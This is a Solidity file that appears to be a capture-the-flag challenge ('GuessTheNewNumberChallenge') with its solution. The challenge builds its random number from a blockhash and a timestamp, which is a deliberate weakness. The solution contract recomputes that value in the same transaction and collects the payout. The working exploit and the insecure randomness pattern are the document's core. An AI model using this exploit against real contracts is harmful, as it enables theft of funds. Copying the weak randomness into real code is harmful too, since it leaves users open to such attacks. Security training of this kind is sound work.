pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

pragma solidity ^0.4.21;

contract GuessTheNewNumberSolution {
    function() public payable { }

    address contractAddress = 0xf6dA6d00e44636ec06A1C3d6d65ED7899F7049b0;
    GuessTheNewNumberChallenge challenge = GuessTheNewNumberChallenge(contractAddress);

    function guess() public payable {
        require(msg.value == 1 ether);
        challenge.guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now)));
    }

    function destroy() public {
        selfdestruct(msg.sender);
    }
}